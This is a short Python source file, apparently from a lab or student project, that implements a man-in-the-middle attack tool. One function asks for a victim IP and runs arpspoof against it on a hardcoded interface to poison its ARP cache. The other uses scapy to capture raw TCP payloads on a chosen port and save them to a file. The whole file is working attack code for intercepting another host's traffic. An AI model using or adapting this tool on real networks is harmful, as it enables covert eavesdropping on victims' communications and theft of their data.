import socket
socket.has_ipv6=False
from scapy.all import *
from scapy.layers.inet import TCP
from helpers.utils import *
import os

def arpoisoner(out_lck, myAddress):

    output(out_lck, "Arp Poisoner")

    victimIP = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")

    os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % ("enx9cebe811a79a", "192.168." + victimIP, myAddress))


def analyzer(out_lck, port, extension):

    file = open("sniffed/pwndcifrato." + extension, "wb")

    output(out_lck, "Analizer")

    time = loop_int_input(out_lck, "Please insert a timeout for the sniffer (in second): ")

    array = []
    sniff(filter="port %s" % port, timeout=time, prn=lambda x: array.append(bytes(x[TCP].payload)))

    for el in array:
        file.write(el)
    file.close()



